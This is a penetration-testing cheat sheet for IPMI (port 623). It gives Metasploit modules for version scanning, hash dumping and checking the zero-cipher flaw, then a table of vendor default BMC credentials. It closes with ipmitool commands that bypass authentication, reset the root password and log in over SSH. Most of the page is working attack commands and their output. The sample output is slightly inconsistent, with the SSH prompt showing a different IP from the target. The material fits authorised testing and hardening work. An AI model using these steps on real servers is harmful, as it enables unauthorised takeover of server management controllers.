---
description: >-
  Intelligent Platform Management Interface (IPMI)  is a set of computer
  interface specifications for an autonomous computer subsystem that provides
  management and monitoring capabilities independently.
---

# 623 - IPMI

### Metasploit

### Find version

```text
msf > use auxiliary/scanner/ipmi/ipmi_version
msf auxiliary(ipmi_version) > set RHOSTS 10.0.0.0/24
msf auxiliary(ipmi_version) > run
[*] Sending IPMI requests to 10.0.0.0->10.0.0.255 (256 hosts)
[+] 10.0.0.22:623 - IPMI - IPMI-2.0 UserAuth(auth_user,non_null_user) PassAuth(md5,md2)Level(1.5,2.0)
```

### Dump hashes

```text
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts [TARGETS] 
run 
```

### Common default credentials

| Product Name  | Default Username  | Default Password  |
| :--- | :--- | :--- |
| HP Integrated Lights Out \(iLO\)  | Administrator  | &lt;factory randomized 8-character string&gt;  |
| Dell Remote Access Card \(iDRAC, DRAC\)  | root  | calvin  |
| IBM Integrated Management Module \(IMM\)  | USERID  | PASSW0RD \(with a zero\)  |
| Fujitsu Integrated Remote Management Controller  | admin  | admin  |
| Supermicro IPMI \(2.0\)  | ADMIN  | ADMIN  |
| Oracle/Sun Integrated Lights Out Manager \(ILOM\)  | root  | changeme  |
| ASUS iKVM BMC  | admin  | admin  |

Resources: 

{% embed url="https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/" %}

## Zero cipher authentication bypass

Zero cipher authentication bypass resulting in administrative access

### Check if vulnerable

```text
msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf auxiliary(ipmi_cipher_zero) > set RHOSTS 10.0.0.22
msf auxiliary(ipmi_cipher_zero) > run
[*] Sending IPMI requests to 10.0.0.22->10.0.0.22 (1 hosts)
[+] 10.0.0.22:623 - IPMI - VULNERABLE: Accepted a session open request
```

### Connect

The Linux ipmitool client is used to interact with the service and bypass authentication \(via the -C 0 option\).

We will set the root user account password to abc123 via IPMI.

```text
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
ID Name Callin Link Auth IPMI Msg Channel Priv Limit
2 root true true true ADMINISTRATOR
3 Oper1 true true true ADMINISTRATOR
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
root@kali:~# ssh root@10.0.0.22
root@10.121.1.22's password: abc123
17
18
19 20
/admin1-> version
SM CLP Version: 1.0.2
SM ME Addressing Version: 1.0.0b
```

